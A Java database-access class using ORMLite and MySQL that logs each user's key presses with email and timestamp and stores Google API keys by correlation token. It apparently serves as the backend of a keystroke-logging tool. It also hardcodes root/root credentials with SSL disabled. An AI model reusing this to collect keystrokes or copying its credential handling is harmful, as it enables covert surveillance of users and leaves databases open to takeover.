import com.j256.ormlite.dao.Dao;
import com.j256.ormlite.dao.DaoManager;
import com.j256.ormlite.jdbc.JdbcConnectionSource;
import com.j256.ormlite.table.TableUtils;

import java.io.IOException;
import java.sql.SQLException;
import java.sql.Timestamp;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.Date;
import java.util.List;

public class DatabaseClient {

    public JdbcConnectionSource GetConnectionSource() {
        try {
            return new JdbcConnectionSource(
                    "jdbc:mysql://127.0.0.1/mysql?" +
                            "user=root&" +
                            "password=root&" +
                            "useJDBCCompliantTimezoneShift=true&" +
                            "useLegacyDatetimeCode=false&" +
                            "serverTimezone=UTC" +
                            "&useSSL=false"
            );
        } catch (SQLException ex) {
            System.out.println("SQLException: " + ex.getMessage());
            System.out.println("SQLState: " + ex.getSQLState());
            System.out.println("VendorError: " + ex.getErrorCode());
            return null;
        }
    }

    public List<KeyLogsEntry> GetLogs() {
        List<KeyLogsEntry> logs = new ArrayList<>();
        try {
            var connection = this.GetConnectionSource();
            Dao<KeyLogsEntry, String> accountDao =
                    DaoManager.createDao(connection, KeyLogsEntry.class);

            accountDao.forEach(logs::add);

            connection.close();
        } catch (SQLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return logs;
    }


    public void SaveCorelationToken(String googleApiKey, String corelationToken) {
        try {
            var connection = this.GetConnectionSource();
            var dao = DaoManager.createDao(connection, CorelationTokenEntry.class);

            var entry = new CorelationTokenEntry();
            entry.CorelationToken = corelationToken;
            entry.GoogleApiKey = googleApiKey;

            dao.create(entry);
            connection.close();
        } catch (SQLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public String GetGoogleKey(String corelationToken) {
        try {
            var connection = this.GetConnectionSource();
            var dao = DaoManager.createDao(connection, CorelationTokenEntry.class);
            var token = dao.queryForEq("CorelationToken", corelationToken).stream().sorted(Comparator.comparing(c -> c.Id)).findFirst().orElse(null);
            connection.close();
            if(token != null)
            {
                return token.GoogleApiKey;
            }
        } catch (SQLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    public void LogUserKeyPress(String email, String key) {
        try {
            var connection = this.GetConnectionSource();
            var dao = DaoManager.createDao(connection, KeyLogsEntry.class);

            var entry = new KeyLogsEntry();
            entry.UserEmail = email;
            entry.Key = key;
            entry.TimeStamp = new Timestamp(new Date().getTime());

            dao.create(entry);
            connection.close();
        } catch (SQLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    public void Initialize() {
        try {
            var conn = this.GetConnectionSource();
            TableUtils.createTableIfNotExists(conn, KeyLogsEntry.class);
            TableUtils.createTableIfNotExists(conn, CorelationTokenEntry.class);
            conn.close();
        } catch (SQLException ex) {
            System.out.println("SQLException: " + ex.getMessage());
            System.out.println("SQLState: " + ex.getSQLState());
            System.out.println("VendorError: " + ex.getErrorCode());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
